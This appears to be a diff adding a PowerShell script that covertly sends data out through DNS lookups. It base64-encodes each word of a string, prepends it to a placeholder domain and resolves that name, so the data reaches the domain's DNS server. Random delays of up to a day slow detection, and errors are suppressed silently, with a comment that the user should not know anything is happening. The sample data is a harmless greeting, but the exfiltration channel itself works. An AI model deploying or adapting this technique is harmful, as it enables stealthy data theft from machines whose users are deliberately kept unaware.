@@ -1,0 +1,60 @@
+$StringToSend = "Hello world, thank you for having me!"
+$MinDelayTime = 60
+$MaxDelayTime = 86400
+$ArrayString = $StringToSend.split(" ")
+$DomainBase = ".domain.com"  
+$Ping = New-Object System.Net.NetworkInformation.Ping
+[int]$TimeOut = 1000
+
+Function Get-PingResponse{
+    param([string] $PingToSend)
+
+    Write-Host $PingToSend
+    try {
+        $result = Test-Connection -ComputerName $PingToSend -Count 1 -Quiet
+    }
+    catch {
+        #Do nothing as we do not want the user to know something is going on. 
+    }
+
+}
+
+Function Start-Delay {
+    $Wait = Get-Random -Minimum $MinDelayTime -Maximum $MaxDelayTime
+    Start-Sleep -Seconds $Wait
+}
+
+Function Get-Bytes{
+    param([string] $StringToBytes)
+    $ByteArray = [System.Text.ASCIIEncoding]::Unicode.GetBytes($StringToBytes)
+    $ByteLength = $ByteArray.Length%3
+   
+    switch($ByteLength){
+        1{
+            $ByteArray = Get-Bytes($StringToBytes + " ")
+         }
+        2{
+            $ByteArray = Get-Bytes($StringToBytes + "  ")
+        }
+        0{
+           #Do nothing here as it can convert to base 64
+        }
+    
+    }
+    
+    return $ByteArray
+}
+
+foreach($Node in $ArrayString){ 
+    try {              
+        $Bytes = Get-Bytes($Node)
+        $Base64String = [Convert]::ToBase64String($Bytes)  
+        $DomainToFind = $Base64String + $DomainBase 
+        Get-PingResponse($DomainToFind)
+        Start-Delay
+    }
+    catch {
+
+    }
+   
+}
